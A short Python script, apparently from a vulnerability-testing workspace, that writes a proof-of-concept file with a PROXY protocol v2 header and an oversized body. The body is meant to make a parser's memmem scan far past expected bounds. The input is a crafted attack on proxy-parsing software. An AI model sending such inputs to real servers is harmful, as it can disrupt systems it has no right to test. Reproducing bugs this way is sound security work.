from pathlib import Path
p=Path('/workspace/poc.bin')
# Try a maliciously large body after accepted header to stress memmem with a large adjusted_size.
sig=b'\r\n\r\n\x00\r\nQUIT\n'
header=sig+bytes([0x21,0x11,0x00,0x24])+bytes([0x41])*32+b'\x12\x34\x56\x78'*2
# Put a huge body without CRLFCRLF so memmem scans far.
body=b'X'*200000+b'GET /proxy HTTP/1.0\r\nHost: x\r\n\r\n'
p.write_bytes(header+body)
print(len(header), len(body))
